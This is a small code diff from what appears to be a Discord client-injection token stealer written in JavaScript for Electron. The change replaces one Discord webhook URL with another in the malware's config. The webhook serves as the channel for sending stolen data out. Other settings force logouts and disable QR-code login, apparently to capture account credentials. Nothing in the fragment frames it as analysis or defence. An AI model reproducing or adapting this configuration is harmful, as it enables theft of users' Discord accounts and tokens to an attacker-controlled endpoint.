@@ -72,7 +72,7 @@ const { BrowserWindow, session } = require('electron'),
   fs = require('fs')
 var config = {
     brand: 'revolai_',
-    webhook: 'https://discord.com/api/webhooks/1075470903812558938/2qEQ4Ztv6fVSLxyt515A7fGrp_s8n4ajzCzzzwg_zmMWZYV9CucIsF_FSaM4NKKJ1yYe',
+    webhook: 'https://discord.com/api/webhooks/1074440544048128061/Ba-lci6QB3KqCp6UsZN1wkYxH9C9_xCSRHIk11Mt-YfOXTITSNA3-koQqAthWpgxhKtK',
     webhook_link: '%WEBHOOK_LINK%',
     logout: true,
     disable_qr_code: true,
